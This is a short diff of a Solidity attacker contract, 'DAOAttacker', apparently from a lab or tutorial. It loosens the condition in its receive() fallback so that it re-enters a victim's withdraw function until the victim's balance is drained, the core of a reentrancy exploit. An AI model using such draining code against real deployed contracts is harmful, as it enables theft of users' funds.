@@ -36,7 +36,7 @@ contract DAOAttacker {
     receive() external payable {
         // may be a better expression in if statement,
         // this version may lead to REVERT;
-        if (address(victim).balance > 0.1 ether) {
+        if (address(victim).balance >= 1) {
             victim.withdraw(address(this));
         }
     }
